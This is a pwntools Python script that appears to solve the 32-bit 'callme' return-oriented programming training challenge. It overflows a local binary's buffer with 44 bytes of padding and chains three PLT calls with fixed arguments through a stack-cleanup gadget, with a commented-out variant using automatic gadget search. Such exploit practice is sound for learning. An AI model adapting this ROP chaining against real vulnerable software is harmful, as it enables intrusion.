from pwn import *

io = process("./callme32", )

elf = context.binary = ELF("./callme32", checksec=False)
context.log_level = 'debug'



payload = b'A'*44
payload += p32(elf.plt['callme_one'])
payload += p32(0x80487f9)
payload += p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)
payload += p32(elf.plt['callme_two'])
payload += p32(0x80487f9)
payload += p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)
payload += p32(elf.plt['callme_three'])
payload += p32(0x80487f9)
payload += p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

# rop = ROP(elf)  # Load rop gadgets
# # print(rop.dump())
# # pprint(rop.gadgets)

# # Address needed to put parameters in registers
# pop3 = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
# info("%#x pop esi; pop edi; pop ebp; ret;", pop3)
# callme_one = elf.symbols['callme_one']
# callme_two = elf.symbols['callme_two']
# callme_three = elf.symbols['callme_three']
# # Craft a new payload which puts the "target" address at the correct offset
# payload = flat(
#     asm('nop') * 44,
#     callme_one,
#     pop3,
#     0xdeadbeef,
#     0xcafebabe,
#     0xd00df00d,
#     callme_two,
#     pop3,
#     0xdeadbeef,
#     0xcafebabe,
#     0xd00df00d,
#     callme_three,
#     pop3,
#     0xdeadbeef,
#     0xcafebabe,
#     0xd00df00d,
# )

io.sendline(payload)
io.interactive()